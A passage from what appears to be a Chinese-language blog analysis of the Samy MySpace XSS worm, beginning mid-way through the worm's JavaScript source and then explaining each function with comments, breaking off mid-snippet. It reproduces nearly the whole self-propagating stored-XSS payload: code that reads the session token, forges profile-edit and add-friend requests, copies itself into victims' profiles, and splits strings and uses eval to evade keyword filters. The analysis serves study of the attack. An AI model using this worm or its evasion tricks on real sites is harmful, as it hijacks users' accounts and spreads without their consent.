&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFromURL</span>(<span class="params">BF, BG</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> T;</span><br><span class="line">    <span class="keyword">if</span> (BG == <span class="string">'Mytoken'</span>) &#123;</span><br><span class="line">        T = B</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        T = <span class="string">' &amp; '</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> U = BG + <span class="string">' = '</span>;</span><br><span class="line">    <span class="keyword">var</span> V = BF.indexOf(U) + U.length;</span><br><span class="line">    <span class="keyword">var</span> W = BF.substring(V, V + <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">var</span> X = W.indexOf(T);</span><br><span class="line">    <span class="keyword">var</span> Y = W.substring(<span class="number">0</span>, X);</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params">AU</span>) </span>&#123;</span><br><span class="line">    M = getFromURL(AU, <span class="string">'friendID'</span>);</span><br><span class="line">    L = getFromURL(AU, <span class="string">'Mytoken'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getQueryParams</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> E = <span class="built_in">document</span>.location.search;</span><br><span class="line">    <span class="keyword">var</span> F = E.substring(<span class="number">1</span>, E.length).split(<span class="string">' &amp; '</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> O = <span class="number">0</span>; O &lt; F.length; O++) &#123;</span><br><span class="line">        <span class="keyword">var</span> I = F[O].split(<span class="string">' = '</span>);</span><br><span class="line">        AS[I[<span class="number">0</span>]] = I[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AS</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> J;</span><br><span class="line"><span class="keyword">var</span> AS = getQueryParams();</span><br><span class="line"><span class="keyword">var</span> L = AS[<span class="string">'Mytoken'</span>];</span><br><span class="line"><span class="keyword">var</span> M = AS[<span class="string">'friendID'</span>];</span><br><span class="line"><span class="keyword">if</span> (location.hostname == <span class="string">'profile.myspace.com'</span>) &#123;</span><br><span class="line">    <span class="built_in">document</span>.location</span><br><span class="line">        = <span class="string">'http: //www.myspace.com'</span> + location.pathname + location.search</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!M) &#123;</span><br><span class="line">        getData(g())</span><br><span class="line">    &#125;</span><br><span class="line">    main()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClientFID</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> findIn(g(), <span class="string">'up_launchIC('</span> + A, A)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nothing</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">paramsToString</span>(<span class="params">AV</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> N = <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    <span class="keyword">var</span> O = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> P <span class="keyword">in</span> AV) &#123;</span><br><span class="line">        <span class="keyword">if</span> (O &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            N += <span class="string">' &amp; '</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> Q = <span class="built_in">escape</span>(AV[P]);</span><br><span class="line">        <span class="keyword">while</span> (Q.indexOf(<span class="string">' + '</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">            Q = Q.replace(<span class="string">' + '</span>, <span class="string">' % 2B'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (Q.indexOf(<span class="string">' &amp; '</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">            Q = Q.replace(<span class="string">' &amp; '</span>, <span class="string">' % 26'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        N += P + <span class="string">' = '</span> + Q; O++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> N</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpSend</span>(<span class="params">BH, BI, BJ, BK</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!J) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'J.onr'</span> + <span class="string">'eadystatechange = BI'</span>);</span><br><span class="line">    J.open(BJ, BH, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (BJ == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        J.setRequestHeader(<span class="string">'Content - Type'</span>, <span class="string">'application / x - www - form - urlencoded'</span>);</span><br><span class="line">        J.setRequestHeader(<span class="string">'Content - Length'</span>, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    J.send(BK); <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findIn</span>(<span class="params">BF, BB, BC</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> R = BF.indexOf(BB) + BB.length;</span><br><span class="line">    <span class="keyword">var</span> S = BF.substring(R, R + <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> S.substring(<span class="number">0</span>, S.indexOf(BC))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHiddenParameter</span>(<span class="params">BF, BG</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> findIn(BF, <span class="string">'name = '</span> + B + BG + B + <span class="string">'value = '</span> + B, B)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getXMLObj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Z = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Z = <span class="keyword">new</span> XMLHttpRe - quest()</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            Z = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Z = <span class="keyword">new</span> ActiveXOb - ject(<span class="string">'Msxml2.XMLHTTP'</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Z = <span class="keyword">new</span> ActiveXOb - ject(<span class="string">'Microsoft.XMLHTTP'</span>)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                Z = <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Z</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> AA = g();</span><br><span class="line"><span class="keyword">var</span> AB = AA.indexOf(<span class="string">'m'</span> + <span class="string">'ycode'</span>);</span><br><span class="line"><span class="keyword">var</span> AC = AA.substring(AB, AB + <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">var</span> AD = AC.indexOf(<span class="string">'D'</span> + <span class="string">'IV'</span>);</span><br><span class="line"><span class="keyword">var</span> AE = AC.substring(<span class="number">0</span>, AD);</span><br><span class="line"><span class="keyword">var</span> AF;</span><br><span class="line"><span class="keyword">if</span> (AE) &#123;</span><br><span class="line">    AE = AE.replace(<span class="string">'jav'</span> + <span class="string">'a'</span>, A + <span class="string">'jav'</span> + <span class="string">'a'</span>);</span><br><span class="line">    AE = AE.replace(<span class="string">'exp'</span> + <span class="string">'r)'</span>, <span class="string">'exp'</span> + <span class="string">'r)'</span> + A);</span><br><span class="line">    AF = <span class="string">'but most of all,samy is my hero. &lt; d'</span> + <span class="string">'iv id = '</span> + AE + <span class="string">'D'</span> + <span class="string">'IV &gt; '</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> AG;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHome</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (J.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = J.responseText;</span><br><span class="line">    AG = findIn(AU, <span class="string">'P'</span> + <span class="string">'rofileHeroes'</span>, <span class="string">' &lt; /td&gt;'</span>);</span><br><span class="line">    AG = AG.substring(<span class="number">61</span>, AG.length);</span><br><span class="line">    <span class="keyword">if</span> (AG.indexOf(<span class="string">'samy'</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (AF) &#123;</span><br><span class="line">            AG += AF;</span><br><span class="line">            <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">            <span class="keyword">var</span> AS = <span class="keyword">new</span> Ar - ray();</span><br><span class="line">            AS[<span class="string">'interestLabel'</span>] = <span class="string">'heroes'</span>;</span><br><span class="line">            AS[<span class="string">'submit'</span>] = <span class="string">'Preview'</span>;</span><br><span class="line">            AS[<span class="string">'interest'</span>] = AG;</span><br><span class="line">            J = getXMLObj();</span><br><span class="line">            httpSend(<span class="string">'/index.cfm ? fuseaction = profile.previewInterests &amp; Mytoken = '</span> + AR,</span><br><span class="line">                postHero, <span class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">postHero</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (J.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = J.responseText;</span><br><span class="line">    <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> Ar - ray();</span><br><span class="line">    AS[<span class="string">'interestLabel'</span>] = <span class="string">'heroes'</span>;</span><br><span class="line">    AS[<span class="string">'submit'</span>] = <span class="string">'Submit'</span>;</span><br><span class="line">    AS[<span class="string">'interest'</span>] = AG;</span><br><span class="line">    AS[<span class="string">'hash'</span>] = getHiddenParame - ter(AU, <span class="string">'hash'</span>);</span><br><span class="line">    httpSend(<span class="string">' / index.cfm ? fuseaction = profile.processInterests &amp; Mytoken = '</span> + AR,</span><br><span class="line">        nothing, <span class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> AN = getClientFID();</span><br><span class="line">    <span class="keyword">var</span> BH = <span class="string">' / index.cfm ? fuseaction = user.viewProfile &amp; friendID = '</span> + AN + <span class="string">' &amp; Mytoken = '</span> + L;</span><br><span class="line">    J = getXMLObj();</span><br><span class="line">    httpSend(BH, getHome, <span class="string">'GET'</span>);</span><br><span class="line">    xmlhttp2 = getXMLObj();</span><br><span class="line">    httpSend2(<span class="string">' / index.cfm ? fuseaction = invite.addfriend_verify &amp; friendID = 11851658 &amp; Mytoken = '</span> + L,</span><br><span class="line">        processxForm, <span class="string">'GET'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processx</span> - <span class="title">Form</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp2.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = xmlhttp2.responseText;</span><br><span class="line">    <span class="keyword">var</span> AQ = getHiddenParameter(AU, <span class="string">'hashcode'</span>);</span><br><span class="line">    <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    AS[<span class="string">'hashcode'</span>] = AQ;</span><br><span class="line">    AS[<span class="string">'friendID'</span>] = <span class="string">'11851658'</span>;</span><br><span class="line">    AS[<span class="string">'submit'</span>] = <span class="string">'Add to Friends'</span>;</span><br><span class="line">    httpSend2(<span class="string">' / index.cfm ? fuseaction = invite.addFriendsProcess &amp; Mytoken = '</span> + AR,</span><br><span class="line">        nothing, <span class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpSend2</span>(<span class="params">BH, BI, BJ, BK</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!xmlhttp2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'xmlhttp2.onr'</span> + <span class="string">'eadystatechange = BI'</span>);</span><br><span class="line">    xmlhttp2.open(BJ, BH, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (BJ == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        xmlhttp2.setRequestHeader(<span class="string">'Content - Type'</span>, <span class="string">'application / x - www - form - urlencoded'</span>); xmlhttp2.setRequestHeader(<span class="string">'Content - Length'</span>, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp2.send(BK); <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">”&gt;<span class="xml"><span class="tag">&lt;/<span class="name">DIV</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里就是这个蠕虫的前导代码了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> J;</span><br><span class="line"><span class="keyword">var</span> AS = getQueryParams();<span class="comment">// 这里是获取用户的信息栏</span></span><br><span class="line"><span class="keyword">var</span> L = AS[<span class="string">'Mytoken'</span>];</span><br><span class="line"><span class="keyword">var</span> M = AS[<span class="string">'friendID'</span>];</span><br><span class="line"><span class="keyword">if</span> (location.hostname == <span class="string">'profile.myspace.com'</span>) &#123;</span><br><span class="line">    <span class="built_in">document</span>.location</span><br><span class="line">        = <span class="string">'http: //www.myspace.com'</span> + location.pathname + location.search</span><br><span class="line">    <span class="comment">// 这里进行重定向到 www 站点从用户的属性页面</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果这里不是在用户的属性页面，是在浏览页面时候遇上的，就开始工作了！</span></span><br><span class="line">    <span class="keyword">if</span> (!M) &#123;</span><br><span class="line">        getData(g())<span class="comment">// g 返回页面特定内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    main()<span class="comment">// ready to go</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><code>getdata</code> 的函数内容很容易理解</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params">AU</span>) </span>&#123;</span><br><span class="line">    M = getFromURL(AU, <span class="string">'friendID'</span>);</span><br><span class="line">    L = getFromURL(AU, <span class="string">'Mytoken'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是 得到用户的属性页的列表：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getQueryParams</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> E = <span class="built_in">document</span>.location.search;</span><br><span class="line">    <span class="keyword">var</span> F = E.substring(<span class="number">1</span>, E.length).split(<span class="string">' &amp; '</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> O = <span class="number">0</span>; O &lt; F.length; O++) &#123;</span><br><span class="line">        <span class="keyword">var</span> I = F[O].split(<span class="string">' = '</span>);</span><br><span class="line">        AS[I[<span class="number">0</span>]] = I[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AS</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这个的标签可以看出，此处实际上没有进行XSS的过滤，所以可以直接提交一个 div 标签，就可以实现 XSS 代码的存储。</p><hr><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> AN = getClientFID();<span class="comment">// 取得uid</span></span><br><span class="line">    <span class="keyword">var</span> BH = <span class="string">' / index.cfm ? fuseaction = user.viewProfile &amp; friendID = '</span> + AN + <span class="string">' &amp; Mytoken = '</span> + L;</span><br><span class="line">    J = getXMLObj();<span class="comment">// 取得 http交互示例</span></span><br><span class="line">    httpSend(BH, getHome, <span class="string">'GET'</span>);<span class="comment">// 伪造浏览用户 profile 的动作 // 这里可能报异常</span></span><br><span class="line">    xmlhttp2 = getXMLObj();<span class="comment">// 这里得到一个 HTTP 交互的示例</span></span><br><span class="line">    httpSend2(<span class="string">' / index.cfm ? fuseaction = invite.addfriend_verify &amp; friendID = 11851658 &amp; Mytoken = '</span> + L,</span><br><span class="line">        processxForm, <span class="string">'GET'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>在 <code>getXMLObj</code> 函数里面使用了比较hack 的写法，应该是避免了人一些针对关键字的检测，其具体的实现代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getXMLObj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Z = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Z = <span class="keyword">new</span> XMLHttpRe - quest()<span class="comment">// 这里就是混淆</span></span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            Z = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Z = <span class="keyword">new</span> ActiveXOb - ject(<span class="string">'Msxml2.XMLHTTP'</span>)<span class="comment">// 混淆</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123; </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Z = <span class="keyword">new</span> ActiveXOb - ject(<span class="string">'Microsoft.XMLHTTP'</span>)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                Z = <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Z</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpSend</span>(<span class="params">BH, BI, BJ, BK</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!J) &#123;<span class="comment">// 这里的J是前面返回的 XHR 实例。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'J.onr'</span> + <span class="string">'eadystatechange = BI'</span>);<span class="comment">// 这里对核心操作进行混淆</span></span><br><span class="line">    J.open(BJ, BH, <span class="literal">true</span>);<span class="comment">// 这里打开一个 XHR 请求 （方式，链接）</span></span><br><span class="line">    <span class="keyword">if</span> (BJ == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        J.setRequestHeader(<span class="string">'Content - Type'</span>, <span class="string">'application / x - www - form - urlencoded'</span>);</span><br><span class="line">        J.setRequestHeader(<span class="string">'Content - Length'</span>, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    J.send(BK); <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，使用了<strong>eval对其状态回调进行了赋值。</strong> 即在其完成后执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHome</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (J.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = J.responseText;</span><br><span class="line">    AG = findIn(AU, <span class="string">'P'</span> + <span class="string">'rofileHeroes'</span>, <span class="string">' &lt; /td&gt;'</span>);</span><br><span class="line">    AG = AG.substring(<span class="number">61</span>, AG.length);</span><br><span class="line">    <span class="keyword">if</span> (AG.indexOf(<span class="string">'samy'</span>) == <span class="number">-1</span>) &#123;<span class="comment">// 这里判断当前用户是否是否关注了 samy</span></span><br><span class="line">        <span class="keyword">if</span> (AF) &#123;</span><br><span class="line">            AG += AF;</span><br><span class="line">            <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">            <span class="keyword">var</span> AS = <span class="keyword">new</span> Ar - ray();</span><br><span class="line">            AS[<span class="string">'interestLabel'</span>] = <span class="string">'heroes'</span>;</span><br><span class="line">            AS[<span class="string">'submit'</span>] = <span class="string">'Preview'</span>;</span><br><span class="line">            AS[<span class="string">'interest'</span>] = AG;</span><br><span class="line">            J = getXMLObj();</span><br><span class="line">            httpSend(<span class="string">'/index.cfm ? fuseaction = profile.previewInterests &amp; Mytoken = '</span> + AR, postHero, <span class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">            <span class="comment">// 这里是核心部分提交对 samy 关注的请求</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的函数在http请求返回时候进行回调，实现添加 samy 关注的功能。</p><hr><p>第二个，请求函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpSend2</span>(<span class="params">BH, BI, BJ, BK</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!xmlhttp2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'xmlhttp2.onr'</span> + <span class="string">'eadystatechange = BI'</span>);</span><br><span class="line">    xmlhttp2.open(BJ, BH, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (BJ == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        xmlhttp2.setRequestHeader(<span class="string">'Content - Type'</span>, <span class="string">'application / x - www - form - urlencoded'</span>); xmlhttp2.setRequestHeader(<span class="string">'Content - Length'</span>, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp2.send(BK); <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面函数的回调函数如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processxForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp2.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = xmlhttp2.responseText;</span><br><span class="line">    <span class="keyword">var</span> AQ = getHiddenParameter(AU, <span class="string">'hashcode'</span>);</span><br><span class="line">    <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    AS[<span class="string">'hashcode'</span>] = AQ;</span><br><span class="line">    AS[<span class="string">'friendID'</span>] = <span class="string">'11851658'</span>;</span><br><span class="line">    AS[<span class="string">'submit'</span>] = <span class="string">'Add to Friends'</span>;</span><br><span class="line">    httpSend2(<span class="string">' / index.cfm ? fuseaction = invite.addFriendsProcess &amp; Mytoken = '</span> + AR,</span><br><span class="line">        nothing, <span class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> AA = g();<span class="comment">// 代码这里获取页面的代码 </span></span><br><span class="line"><span class="keyword">var</span> AB = AA.indexOf(<span class="string">'m'</span> + <span class="string">'ycode'</span>);</span><br><span class="line"><span class="keyword">var</span> AC = AA.substring(AB, AB + <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">var</span> AD = AC.indexOf(<span class="string">'D'</span> + <span class="string">'IV'</span>);</span><br><span class="line"><span class="keyword">var</span> AE = AC.substring(<span class="number">0</span>, AD);</span><br><span class="line"><span class="comment">// 这里的这几行，对页面的内容进行截取操作</span></span><br></pre></td></tr></table></figure><p>这里对页面的内容进行获取，截取出需要的段。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> B = <span class="built_in">String</span>.fromCharCode(<span class="number">34</span>);</span><br><span class="line"><span class="keyword">var</span> A = <span class="built_in">String</span>.fromCharCode(<span class="number">39</span>);<span class="comment">// 这里的是 JS 的从AsCII 转字符的函数</span></span><br><span class="line"><span class="comment">// 对应的是 ' 与 " </span></span><br><span 